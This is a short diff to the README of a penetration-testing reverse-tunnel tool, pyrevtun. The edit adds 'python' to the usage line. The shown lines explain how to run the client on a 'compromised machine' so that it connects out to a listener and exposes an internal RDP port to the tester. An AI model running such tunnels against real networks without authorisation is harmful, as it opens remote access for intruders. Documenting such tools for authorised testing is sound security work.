@@ -25,7 +25,7 @@ Tool Usage
 
 2) On compromised machine, setup pyrevtun in client mode:
 
-- pyrevtun.py -m client -l [listener IP:port] -c [target IP:port] -p [auth password]
+- python pyrevtun.py -m client -l [listener IP:port] -c [target IP:port] -p [auth password]
 - e.g. python pyrevtun.py -m client -l 192.168.102.59:443 -c 10.5.5.5:3389 -p pass
 - This connection will open up the chosen local port on the pen test machine.
 
